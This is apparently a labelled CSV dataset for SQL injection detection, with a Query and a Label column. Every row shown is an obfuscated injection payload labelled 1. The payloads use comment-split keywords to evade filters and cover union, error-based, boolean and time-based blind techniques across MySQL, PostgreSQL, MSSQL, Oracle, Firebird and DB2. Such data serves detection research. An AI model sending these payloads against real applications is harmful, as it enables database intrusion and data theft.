Query,Label
"1  )   an/**/d make_se/**/t  (  1559  =  4863,4863  )  ",1
-9484' o/**/r   (  7129  =  2349  )  *2349 an/**/d 'fcsa' lik/**/e 'fcsa,1
"1'  )   o/**/r   (  selec/**/t 9173 fro/**/m  (  se/**/lect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  ",1
"1"" wher/**/e 5328  =  5328 an/**/d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   u/**/nion all s/**/elect nul/**/l,nul/**/l,nul/**/l,n/**/ull,nu/**/ll,nu/**/ll,nu/**/ll#",1
1'  )   as ihsc wher/**/e 3978  =  3978,1
"-6125'||  (  sel/**/ect 'hwnm' whe/**/re 1428  =  1428 unio/**/n all sele/**/ct 1428,1428,1428,1428,1428,1428#",1
sel/**/ect   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as i/**/nt  )  /  (  sel/**/ect 0 fr/**/om dual  )   end  )   fr/**/om dual--,1
1 rlik/**/e   (  se/**/lect * fro/**/m   (  s/**/elect  (  sleep  (  5   )    )     )  sgvo  ) ,1
"1'   )    )    an/**/d row  (  6237,7469  )  >  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x f/**/rom   (  se/**/lect 5192 u/**/nion selec/**/t 3785 uni/**/on se/**/lect 3931 un/**/ion sele/**/ct 7158  )  a group b/**/y x  )   a/**/nd    (    (   'pbtf'  =  'pbtf",1
"1'  )   w/**/here 7391  =  7391 o/**/r   (  selec/**/t 9173 fro/**/m  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  --",1
1'+  (  se/**/lect dklj w/**/here 3265  =  3265,1
"1'  )   a/**/nd 3202  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   ",1
"1'   )    )    an/**/d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   'cbwx'  =  'cbwx",1
-3422%'  )   o/**/r 5903  =    (  'qqpjq'||  (  sel/**/ect case 5903 when 5903 then 1 else 0 end fro/**/m rdb$data/**/base  )  ||'qzvzq'  )   an/**/d   (  '%'  =  ',1
s/**/elect pg_sleep  (  5  )   a/**/nd    (    (     (  9476  =  9476,1
"1 o/**/r row  (  1045,7562  )  >  (  selec/**/t count  (  *  )  ,concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om   (  se/**/lect 8488 un/**/ion se/**/lect 5584 uni/**/on sel/**/ect 3051 unio/**/n sel/**/ect 1210  )  a group b/**/y x  )  -- fwzl",1
-3083  )   o/**/r 5221  =  7829,1
"1'   )    )    u/**/nion all sel/**/ect nul/**/l,nul/**/l,nu/**/ll--",1
"1""  )   as vcvw wher/**/e 2445  =  2445 a/**/nd 8594  =    (  se/**/lect 8594 fro/**/m pg_sleep  (  5   )    )   --",1
waitfo/**/r delay '0:0:5' an/**/d    (    (     (  'ozjl' l/**/ike 'ozjl,1
"1%' o/**/r upda/**/texml  (  1808,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   a/**/nd '%'  =  '",1
"1'   )    )    a/**/nd   (  sele/**/ct 2*  (  if   (    (   se/**/lect * fr/**/om   (  sele/**/ct concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   'yzdp'  =  'yzdp",1
"-3411'   )    )     )   unio/**/n all sel/**/ect 3185,3185,3185,3185,3185,3185,3185,3185--",1
"-6254"" whe/**/re 8941  =  8941 o/**/r elt  (  1032  =  1032,3623  )  --",1
"1' an/**/d 3580  =    (  sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.t/**/ables as t3  )  --",1
1   )    )     )   o/**/rder b/**/y 1#,1
"-5027%""   )    )    o/**/r 5903  =    (  'qqpjq'||  (  sele/**/ct case 5903 when 5903 then 1 else 0 end fr/**/om rdb$data/**/base  )  ||'qzvzq'  )   an/**/d    (    (   ""%""  =  """,1
selec/**/t   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  sel/**/ect 4006 fro/**/m master..sysda/**/tabases  )   end  )  --,1
"1'+  (  s/**/elect 'tzey' wh/**/ere 4491  =  4491 u/**/nion all sele/**/ct nul/**/l,n/**/ull,nu/**/ll,nul/**/l,n/**/ull,nul/**/l,nu/**/ll,n/**/ull--",1
"sel/**/ect count  (  *  )   f/**/rom generate_series  (  1,5000000  )  # fnck",1
1 o/**/rd/**/er b/**/y 1#,1
1   )    )    as xbii wh/**/ere 2262  =  2262 o/**/r sleep  (  5  )  --,1
-9340  )   wh/**/ere 5462  =  5462 o/**/r 3038  =  3038,1
1'  )   o/**/r sleep  (  5  )   a/**/nd   (  'fizk'  =  'fizk,1
"-6405  )   as ilah wh/**/ere 5145  =  5145 un/**/ion all selec/**/t 5145,5145,5145,5145,5145--",1
1   )    )    a/**/nd   (  4169  =  9887  )  *9887 an/**/d    (    (   1137  =  1137,1
"s/**/elect count  (  *  )   f/**/rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 an/**/d 'bnfu' lik/**/e 'bnfu",1
1  )   w/**/here 6472  =  6472,1
"1%""   )    )    an/**/d row  (  6237,7469  )  >  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x f/**/rom   (  s/**/elect 5192 u/**/nion sel/**/ect 3785 un/**/ion sele/**/ct 3931 uni/**/on sele/**/ct 7158  )  a group b/**/y x  )   a/**/nd    (    (   ""%""  =  """,1
-4595'  )   whe/**/re 4892  =  4892 o/**/r/**/der b/**/y 1--,1
"1   )    )    o/**/r row  (  1045,7562  )  >  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m   (  sel/**/ect 8488 uni/**/on sel/**/ect 5584 unio/**/n s/**/elect 3051 un/**/ion s/**/elect 1210  )  a group b/**/y x  )   a/**/nd    (    (   8294  =  8294",1
"1'   )    )    an/**/d make_se/**/t  (  8403  =  8403,8899  )   an/**/d    (    (   'sxgl'  =  'sxgl",1
1'   )    )    as xirr wher/**/e 2425  =  2425,1
"1'   )    )    unio/**/n all s/**/elect nul/**/l,nu/**/ll,nu/**/ll,n/**/ull,n/**/ull,nu/**/ll,n/**/ull,nu/**/ll--",1
1' rl/**/ike   (  sel/**/ect * fro/**/m   (  selec/**/t  (  sleep  (  5   )    )     )  vwyq  )  #,1
1'   )    )    as cmll whe/**/re 7948  =  7948 an/**/d 4386  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s/**/elect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d    (    (   ""jzbb""  =  ""jzbb",1
"1'   )    )    as xrre wher/**/e 1172  =  1172 a/**/nd updat/**/exml  (  3393,concat  (  0x2e,0x7171706a71,  (  s/**/elect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"1,  (  begi/**/n if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"1'||  (  selec/**/t 'yhkt' fro/**/m dual wh/**/ere 7105  =  7105 o/**/r row  (  1045,7562  )  >  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )   x fr/**/om   (  sel/**/ect 8488 uni/**/on selec/**/t 5584 u/**/nion sele/**/ct 3051 u/**/nion se/**/lect 1210  )  a group b/**/y x   )    )   ||'",1
"1'   )    )     )   o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    a/**/nd    (    (     (  'pded'  =  'pded",1
1  )   a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel/**/ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   f/**/rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd   (  3836  =  3836,1
"1' o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d 'ntaw'  =  'ntaw",1
"1%""   )    )    a/**/nd   (  3020  =  3020  )  *6703 a/**/nd    (    (   ""%""  =  """,1
1%'   )    )    an/**/d 4595  =  4595#,1
"exp  (  ~  (  sele/**/ct * f/**/rom   (  selec/**/t concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
"1   )    )    as avdz w/**/here 1881  =  1881 an/**/d 6510  =    (  selec/**/t count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'+  (  sele/**/ct 'stdl' wher/**/e 4581  =  4581,1
1%'   )    )    a/**/nd 2006  =  2006,1
"1%""  )   uni/**/on all s/**/elect n/**/ull,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l,nu/**/ll,nu/**/ll,nu/**/ll--",1
1   )    )    as dqfl wher/**/e 7527  =  7527,1
"1' i/**/n boolean mode  )   o/**/r 5356  =    (  sel/**/ect count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""   )    )    a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
s/**/elect case when 7717  =  7717 then 1 else n/**/ull end--,1
"1%""  )   o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    an/**/d   (  ""%""  =  """,1
"  (  sele/**/ct * f/**/rom generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limi/**/t 1  )  ",1
"1  )   as vzyk whe/**/re 5103  =  5103 an/**/d 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1' o/**/r upd/**/atexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sele/**/ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   an/**/d 'vvkl'  =  'vvkl",1
"1'   )    )    an/**/d 4241  =  convert  (  i/**/nt,  (  s/**/elect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s/**/elect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   'wzrj'  =  'wzrj",1
"1'  )   o/**/r row  (  1045,7562  )  >  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om   (  se/**/lect 8488 unio/**/n sele/**/ct 5584 unio/**/n sele/**/ct 3051 un/**/ion s/**/elect 1210  )  a group b/**/y x  )   a/**/nd   (  'cogk'  =  'cogk",1
"-1692'  )   un/**/ion all selec/**/t 7074,7074,7074,7074,7074,7074,7074#",1
1'||  (  sele/**/ct 'nvvm' fr/**/om dual wher/**/e 5567  =  5567 rli/**/ke   (  sele/**/ct * f/**/rom   (  se/**/lect  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1
"1""  )   as sraw whe/**/re 1997  =  1997 an/**/d   (  se/**/lect 2*  (  if   (    (   s/**/elect * fr/**/om   (  sele/**/ct concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1""  )   wh/**/ere 9248  =  9248",1
"1""  )   wh/**/ere 9855  =  9855",1
"1 a/**/nd 3707  =    (  s/**/elect count  (  *  )   f/**/rom sysibm.systa/**/bles as t1,sysibm.systa/**/bles as t2,sysibm.systa/**/bles as t3  )  -- xlfz",1
"sel/**/ect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3 an/**/d    (    (   ""tbcc""  =  ""tbcc",1
-7345  )   unio/**/n all sele/**/ct 3866#,1
"1   )    )     )   un/**/ion all sel/**/ect nul/**/l,nul/**/l,n/**/ull,nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nul/**/l#",1
"1%""   )    )    a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    a/**/nd    (    (   ""%""  =  """,1
1' rli/**/ke sleep  (  5  )  #,1
"1   )    )    as hrks whe/**/re 7637  =  7637 o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   --",1
1' w/**/here 8469  =  8469,1
"1'   )    )    a/**/nd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )   an/**/d    (    (   'ngwt'  =  'ngwt",1
"1'  )   as pki/**/s wh/**/ere 3446  =  3446 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
"1"" wh/**/ere 6785  =  6785 an/**/d 3580  =    (  sel/**/ect count  (  *  )   fr/**/om domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tabl/**/es as t3  )  --",1
"1%'   )    )    o/**/r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nul/**/l  )   a/**/nd    (    (   '%'  =  '",1
1'  )   a/**/nd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sele/**/ct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
1' i/**/n boolean mode  )   rl/**/ike   (  se/**/lect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   #,1
"se/**/lect benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",1
"-6440   )    )     )   u/**/nion all selec/**/t 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1
"-9924   )    )    as zgqa wh/**/ere 2867  =  2867 u/**/nion all s/**/elect 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
1  )   as gfhf wh/**/ere 5804  =  5804 o/**/r 6793  =    (  selec/**/t 6793 fro/**/m pg_sleep  (  5   )    )   --,1
"1""  )   as dgzf w/**/here 4834  =  4834",1
-4324 o/**/rder b/**/y 1--,1
"-8557 o/**/r 1 group b/**/y concat  (  0x7171706a71,  (  selec/**/t   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo/**/r  (  ran/**/d  (  0  )  *2   )    )    havi/**/ng mi/**/n  (  0  )  #",1
end--,1
"1""   )    )     )   o/**/r 8421  =    (  s/**/elect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )    a/**/nd    (    (     (  ""ugtw""  =  ""ugtw",1
1   )    )    rli/**/ke   (  s/**/elect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    an/**/d    (    (   4279  =  4279,1
1%'   )    )    rlik/**/e sleep  (  5  )  #,1
"1' a/**/nd 2716  =    (  sel/**/ect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as fwru whe/**/re 5262  =  5262 an/**/d 4241  =  convert  (  i/**/nt,  (  sel/**/ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sel/**/ect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""  )   as xwnu w/**/here 6490  =  6490 unio/**/n all selec/**/t n/**/ull,n/**/ull,nul/**/l,n/**/ull,n/**/ull,nul/**/l--",1
1'  )   as wpmv wher/**/e 1479  =  1479 an/**/d 3754  =    (  s/**/elect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   f/**/rom dual  )  --,1
"1 a/**/nd 3202  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   ",1
1' o/**/r   (  s/**/elect * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  ydpu  )   an/**/d 'bwtk'  =  'bwtk,1
"-8754""   )    )     )   uni/**/on all sele/**/ct 7391,7391,7391,7391,7391,7391,7391--",1
"-4406%' unio/**/n all sele/**/ct 9599,9599,9599,9599#",1
"1  )   as rnfb w/**/here 2405  =  2405 o/**/r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1  )   o/**/r   (  sele/**/ct * fro/**/m   (  se/**/lect  (  sleep  (  5   )    )     )  sddo  )  #,1
1 an/**/d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1
"sele/**/ct benchmark  (  5000000,md5  (  0x714e4153   )    )   #",1
"1%'  )   an/**/d 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    an/**/d   (  '%'  =  '",1
"-6550'  )   wh/**/ere 1675  =  1675 un/**/ion all sele/**/ct 1675,1675,1675,1675,1675,1675,1675--",1
"1'  )   whe/**/re 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
1  )   as uuro w/**/here 6784  =  6784,1
-7720   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   an/**/d    (    (   8254  =  8254,1
"1   )    )    a/**/nd row  (  6237,7469  )  >  (  sele/**/ct count  (  *  )  ,concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m   (  selec/**/t 5192 unio/**/n selec/**/t 3785 un/**/ion se/**/lect 3931 un/**/ion se/**/lect 7158  )  a group b/**/y x  )   an/**/d    (    (   9325  =  9325",1
"1,  (  se/**/lect   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  s/**/elect 5154 f/**/rom master..sysdatabas/**/es  )   end   )    )   ",1
"-6014"" o/**/r make_se/**/t  (  3003  =  2609,2609  )  ",1
1  )   wh/**/ere 6424  =  6424,1
1%' o/**/r sleep  (  5  )  #,1
1' o/**/r sleep  (  5  )   a/**/nd 'yudo'  =  'yudo,1
1'||  (  sele/**/ct 'sxya' wher/**/e 3578  =  3578,1
"1""   )    )     )   o/**/r 4411  =    (  s/**/elect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an/**/d    (    (     (  ""nrhz"" li/**/ke ""nrhz",1
"selec/**/t * fro/**/m generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   li/**/mit 1--",1
"1'  )   o/**/r   (  sele/**/ct 2*  (  if   (    (   selec/**/t * fr/**/om   (  selec/**/t concat  (  0x7171706a71,  (  sele/**/ct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   a/**/nd   (  'lxoc'  =  'lxoc",1
"1' whe/**/re 4150  =  4150 a/**/nd elt  (  8012  =  6026,6026  )  --",1
"1,iif  (  6333  =  1227,1,1/0  )  ",1
"1   )    )    a/**/nd 8189  =    (  sel/**/ect count  (  *  )   fr/**/om sysibm.systabl/**/es as t1,sysibm.systab/**/les as t2,sysibm.systa/**/bles as t3  )  --",1
"1""  )   as jqli w/**/here 7793  =  7793",1
1'   )    )     )   a/**/nd 6991  =  5579,1
1' o/**/r 6793  =    (  selec/**/t 6793 f/**/rom pg_sleep  (  5   )    ) ,1
1 wher/**/e 1568  =  1568 o/**/r   (  sele/**/ct * f/**/rom   (  s/**/elect  (  sleep  (  5   )    )     )  sddo  )  #,1
"1  )   as idvt wher/**/e 3490  =  3490 a/**/nd 9660  =    (  s/**/elect count  (  *  )   fro/**/m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" an/**/d 8148  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   --",1
"1' whe/**/re 1093  =  1093 uni/**/on all selec/**/t nul/**/l,nul/**/l,nul/**/l,n/**/ull,nul/**/l,nul/**/l,nul/**/l--",1
 (  sele/**/ct * f/**/rom   (  sel/**/ect  (  sleep  (  5   )    )     )  acdk  )  #,1
1'+  (  s/**/elect 'kcix' whe/**/re 1117  =  1117,1
1'+  (  selec/**/t 'jaok' whe/**/re 2592  =  2592,1
"1'   )    )    o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    an/**/d    (    (   'ossj'  =  'ossj",1
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   a/**/nd    (    (     (  'aqdj'  =  'aqdj",1
"1"" a/**/nd 3202  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   ",1
